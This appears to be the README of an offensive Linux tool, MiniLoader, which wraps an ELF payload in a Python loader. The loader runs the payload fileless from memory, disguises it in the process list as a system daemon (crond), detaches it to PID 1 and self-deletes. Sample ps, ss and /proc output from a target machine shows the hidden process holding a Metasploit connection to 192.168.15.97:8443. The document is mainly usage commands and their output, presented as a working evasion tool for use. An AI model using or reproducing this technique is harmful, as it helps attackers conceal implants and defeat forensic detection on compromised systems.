# MiniLoader

## Overview

## Using the builder
- Specify your input elf (stager/stageless) with `-b`
- Specify the output file name with `-o`
````
python3 minibuilder.py --help                                                                            1 ↵
usage: minibuilder.py [-h] [-b BINARY] [-o OUTPUT]

options:
  -h, --help            show this help message and exit
  -b BINARY, --binary BINARY
                        The binary to load into memory, file should be an elf.
  -o OUTPUT, --output OUTPUT
                        The final loaders filename to output.
````
- Example usage
````
python3 minibuilder.py -b /tmp/stager.elf -o loader
````
- An output file named `loader` will be created in your pwd

## Using the loader
- Specify how you would like your elf to show up in the process list, you may include a full (fake) path as well as arguments
````
python3 loader --help
usage: loader [-h] [-c CMDLINE]

options:
  -h, --help            show this help message and exit
  -c CMDLINE, --cmdline CMDLINE
                        The cmdline to appear as e.x. '/usr/sbin/crond -f'
````
- Example usage on a target machine
- The script will self delete, removing any on disk traces of the loader
````
python3 loader -c '/usr/sbin/crond -f'
[+] Python3 detecting...proceeding
[+] Child process PID --> 8910
[+] Script '/tmp/loader' has been self-deleted.
[+] /proc/self/fd/3 --> ['/usr/sbin/crond -f']
````
## How does it look
- Example process list
````
root@ubuntu:/tmp# ps -elf 
F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
4 S root           1       0  0  80   0 -  5446 do_epo 15:34 ?        00:00:02 /usr/lib/systemd/systemd --system --deserialize=23
4 S root         300       1  0  80   0 -  4550 do_epo 15:34 ?        00:00:00 /usr/lib/systemd/systemd-logind
0 S root         301       1  0  80   0 -   952 hrtime 15:34 ?        00:00:00 /usr/sbin/cron -f -P
4 S message+     302       1  0  80   0 -  2430 do_epo 15:34 ?        00:00:00 @dbus-daemon --system --address=systemd: --nofork -
0 S root         306       1  0  80   0 -  7349 do_sys 15:34 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run
4 S root         329       1  0  80   0 -   683 do_sel 15:34 pts/0    00:00:00 /sbin/agetty -o -p -- \u --noclear --keep-baud - 11
4 S root         338       1  0  80   0 -   683 do_sel 15:34 pts/2    00:00:00 /sbin/agetty -o -p -- \u --noclear - linux
4 S syslog       368       1  0  80   0 - 38218 do_sel 15:34 ?        00:00:00 /usr/sbin/rsyslogd -n -iNONE
5 S root         656       1  0  80   0 - 10712 do_epo 15:34 ?        00:00:00 /usr/lib/postfix/sbin/master -w
4 S postfix      660     656  0  80   0 - 10834 do_epo 15:34 ?        00:00:00 qmgr -l -t unix -u
4 S systemd+    6289       1  0  80   0 -  4745 do_epo 15:37 ?        00:00:00 /usr/lib/systemd/systemd-networkd
4 S root        6295       1  0  80   0 -  8541 do_epo 15:37 ?        00:00:00 /usr/lib/systemd/systemd-journald
4 S systemd+    6519       1  0  80   0 -  5363 do_epo 15:37 ?        00:00:00 /usr/lib/systemd/systemd-resolved
4 S root        7533       1  0  80   0 -  2423 do_wai 15:37 pts/1    00:00:00 /bin/login -f --
4 S root        7544    7533  0  80   0 -  2128 do_sel 15:37 pts/1    00:00:00 -bash
4 S root        8059       1  0  80   0 -  3005 do_sys 15:41 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 star
4 S postfix     8829     656  0  80   0 - 10826 do_epo 20:34 ?        00:00:00 pickup -l -t unix -u -c
5 S root        8861    8059  0  80   0 -  3734 do_sys 20:47 ?        00:00:00 sshd: root@pts/3
0 S root        8865       1  0  80   0 -  4958 do_epo 20:47 ?        00:00:00 /usr/lib/systemd/systemd --user
5 S root        8866    8865  0  80   0 -  5290 do_sig 20:47 ?        00:00:00 (sd-pam)
4 S root        8875    8861  0  80   0 -  2133 do_wai 20:47 pts/3    00:00:00 -bash
0 S root        8910       1  0  80   0 -   793 do_sel 20:49 pts/3    00:00:00 /usr/sbin/crond -f
4 R root        8913    8875  0  80   0 -  2733 -      20:51 pts/3    00:00:00 ps -elf
````
- Our loaded elf is pid `8910`, as you can see we are a child of pid `1`
- Example `ss` output 
````
root@ubuntu:/tmp# ss -antpu
Netid      State       Recv-Q      Send-Q                      Local Address:Port                         Peer Address:Port       Process                                                                                                                           
udp        UNCONN      0           0                              127.0.0.54:53                                0.0.0.0:*           users:(("systemd-resolve",pid=6519,fd=16))                                                                                       
udp        UNCONN      0           0                           127.0.0.53%lo:53                                0.0.0.0:*           users:(("systemd-resolve",pid=6519,fd=14))                                                                                       
udp        UNCONN      0           0                     192.168.15.119%eth0:68                                0.0.0.0:*           users:(("systemd-network",pid=6289,fd=20))                                                                                       
tcp        LISTEN      0           4096                           127.0.0.54:53                                0.0.0.0:*           users:(("systemd-resolve",pid=6519,fd=17))                                                                                       
tcp        LISTEN      0           100                             127.0.0.1:25                                0.0.0.0:*           users:(("master",pid=656,fd=13))                                                                                                 
tcp        LISTEN      0           4096                        127.0.0.53%lo:53                                0.0.0.0:*           users:(("systemd-resolve",pid=6519,fd=15))                                                                                       
tcp        ESTAB       0           0                          192.168.15.119:45554                       192.168.15.97:8443        users:(("3",pid=8910,fd=4))                                                                                                      
--snip--
````
- Our elf file has the established connection to `192.168.15.97:8443` (Metasploit)
- Example `/proc/<pid>/maps`
````
root@ubuntu:/tmp# cat /proc/8910/maps
00400000-00401000 rwxp 00000000 00:01 22101153                           /memfd:k (deleted)
008be000-008c6000 rw-p 00000000 00:00 0                                  [heap]
703baf600000-703baf8e8000 rwxp 00000000 00:00 0 
703bafa45000-703bafa46000 rwxp 00000000 00:00 0 
7fff821bc000-7fff821dd000 rw-p 00000000 00:00 0                          [stack]
7fff821eb000-7fff821ef000 r--p 00000000 00:00 0                          [vvar]
7fff821ef000-7fff821f1000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
````
- It shows deleted, however it does not reference the `loader` in any way
